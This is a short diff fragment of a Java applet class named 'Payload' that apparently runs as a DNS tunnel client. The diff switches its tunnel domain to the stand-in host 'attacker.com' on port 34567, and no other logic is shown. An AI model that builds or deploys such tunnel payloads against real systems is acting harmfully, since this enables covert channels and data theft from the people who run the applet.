@@ -11,7 +11,7 @@ public class Payload extends Applet {
     }
 
     private final int port = 34567;
-    private final String domain = "tunnel.bender";
+    private final String domain = "attacker.com";
     private final Mode mode = Mode.DNS_TUNNEL_CLIENT;
 
     public static void main(String[] args) {
